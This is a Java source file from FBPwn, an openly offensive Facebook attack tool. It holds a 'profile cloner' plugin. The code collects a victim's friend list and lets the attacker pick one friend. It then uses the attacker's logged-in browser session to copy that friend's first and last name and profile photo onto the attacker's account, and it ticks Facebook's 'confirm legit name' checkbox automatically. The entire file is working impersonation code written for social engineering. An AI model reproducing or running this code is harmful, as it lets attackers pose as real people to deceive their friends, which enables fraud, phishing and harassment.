/*
 * FBPwn
 * 
 * http://sourceforge.net/projects/fbpwn/
 * 
 * Copyright (C) 2011 - FBPwn
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
package fbpwn.plugins.core;

import fbpwn.plugins.ui.ProfileCloningDialog;
import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.html.HtmlAnchor;
import com.gargoylesoftware.htmlunit.html.HtmlCheckBoxInput;
import com.gargoylesoftware.htmlunit.html.HtmlElement;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;
import fbpwn.core.AuthenticatedAccount;
import fbpwn.core.FacebookAccount;
import fbpwn.ui.FacebookGUI;
import fbpwn.core.FacebookTask;
import fbpwn.core.FacebookTaskState;
import java.awt.Graphics2D;
import java.awt.Image;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.SwingUtilities;

public class ProfileClonerTask extends FacebookTask {

    private FacebookAccount targetClone;
    private String targetFname;
    private String targetLname;
    private ImageIcon Pic;

    /**
     * Creates a new add friends task
     * @param FacebookGUI The GUI used for updating the task's progress
     * @param facebookProfile The victim's profile
     * @param authenticatedProfile The attacker's profile
     * @param workingDirectory The directory used to save all the dumped data
     */
    public ProfileClonerTask(FacebookGUI FacebookGUI,
            FacebookAccount facebookProfile,
            AuthenticatedAccount authenticatedProfile,
            File workingDirectory) {
        super(FacebookGUI, facebookProfile, authenticatedProfile, workingDirectory);
    }

    @Override
    public boolean run() {
        try {
            setTaskState(FacebookTaskState.Running);
            getFacebookGUI().updateTaskProgress(this);
            setMessage("Getting friend list");
            setPercentage(0.0);
            getFacebookGUI().updateTaskProgress(this);
            final ArrayList<FacebookAccount> victimsFriendList = getFacebookTargetProfile().getFriends();

            if (checkForCancel()) {
                return true;
            }


            if (victimsFriendList == null) {
                setMessage("Failed to get friend list");
                setPercentage(0.0);
                setTaskState(FacebookTaskState.Finished);
                getFacebookGUI().updateTaskProgress(this);
                return true;
            }

            try {
                SwingUtilities.invokeAndWait(new Runnable() {

                    @Override
                    public void run() {
                        ProfileCloningDialog dialog = new ProfileCloningDialog(null, true, victimsFriendList);
                        targetClone = dialog.showSelectionDialog();
                    }
                });
            } catch (InterruptedException ex) {
                Logger.getLogger(AddVictimsFriends.class.getName()).log(Level.SEVERE, null, ex);
            } catch (InvocationTargetException ex) {
                Logger.getLogger(AddVictimsFriends.class.getName()).log(Level.SEVERE, null, ex);
            }
            if (targetClone == null) {
                return true;
            }
            targetFname = targetClone.getName().substring(0, targetClone.getName().indexOf(" "));
            targetLname = targetClone.getName().substring(targetClone.getName().indexOf(" ") + 1);
            String targetPicURL = targetClone.getProfilePhotoURL();
            Pic = new ImageIcon(new URL(targetPicURL));

            if (checkForCancel()) {
                return true;
            }

            setMessage("Cloning Name");
            getFacebookGUI().updateTaskProgress(this);
            HtmlPage settings = getAuthenticatedProfile().getBrowser().getPage("http://m.facebook.com/settings.php?name&refid=31");
            HtmlForm changeNameForm = settings.getForms().get(0);
            HtmlElement firstName = changeNameForm.getInputByName("new_first_name");
            firstName.setAttribute("value", targetFname);
            HtmlElement midName = changeNameForm.getInputByName("new_middle_name");
            midName.setAttribute("value", "");
            HtmlElement lastName = changeNameForm.getInputByName("new_last_name");
            lastName.setAttribute("value", targetLname);
            HtmlSubmitInput submit = settings.getForms().get(0).getInputByValue("Save");

            if (checkForCancel()) {
                return true;
            }

            HtmlPage confirm = submit.click();
            HtmlCheckBoxInput checkBox = confirm.getForms().get(0).getInputByName("confirm_legit_new_name");
            checkBox.click();
            HtmlSubmitInput save = confirm.getForms().get(0).getInputByValue("Save");
            HtmlPage returnPage = save.click();

            if (checkForCancel()) {
                return true;
            }

            setMessage("Cloning profile picture");
            getFacebookGUI().updateTaskProgress(this);
            uploadImage();

            if (checkForCancel()) {
                return true;
            }

            setTaskState(FacebookTaskState.Finished);
            setPercentage(100.0);
            if (returnPage.asXml().contains(targetFname)) {
                setMessage("Cloned");
            } else {
                setMessage("Can't change identity for this profile anymore");
            }
            getFacebookGUI().updateTaskProgress(this);
            return true;
        } catch (IOException ex) {
            Logger.getLogger(ProfileClonerTask.class.getName()).log(Level.SEVERE, null, ex);
            return false;
        } catch (FailingHttpStatusCodeException ex) {
            Logger.getLogger(ProfileClonerTask.class.getName()).log(Level.SEVERE, null, ex);
            return false;
        }

    }

    @Override
    public void init() {
    }

    private void uploadImage() throws IOException {

        File tempImgFile = new File("temp.jpg");
        Image img = Pic.getImage();
        BufferedImage bi = new BufferedImage(img.getWidth(null), img.getHeight(null), BufferedImage.TYPE_3BYTE_BGR);
        Graphics2D g2 = bi.createGraphics();

        g2.drawImage(img, 0, 0, null);
        g2.dispose();

        ImageIO.write(bi, "jpg", tempImgFile);

        HtmlPage uploadPage = getAuthenticatedProfile().getBrowser().getPage("http://m.facebook.com/upload.php?refid=7");
        uploadPage.getForms().get(0).getInputByName("file1").setAttribute("value", tempImgFile.getAbsolutePath());
        uploadPage.getForms().get(0).getInputByValue("Upload").click();
        HtmlPage mobProfilePage = getAuthenticatedProfile().getBrowser().getPage("http://m.facebook.com/profile.php?refid=7");
        List<HtmlAnchor> anchors = mobProfilePage.getAnchors();
        for (HtmlAnchor anc : anchors) {
            if (anc.getAttribute("class").equals("ai ail")) {
                HtmlPage page = getAuthenticatedProfile().getBrowser().getPage("http://m.facebook.com" + anc.getHrefAttribute());
                HtmlPage click = page.getAnchorByText("Make Profile Picture").click();
                click.getForms().get(0).getInputByValue("Confirm").click();
                break;
            }
        }
        tempImgFile.delete();
    }

    @Override
    public String toString() {
        return "Clone a profile";
    }
}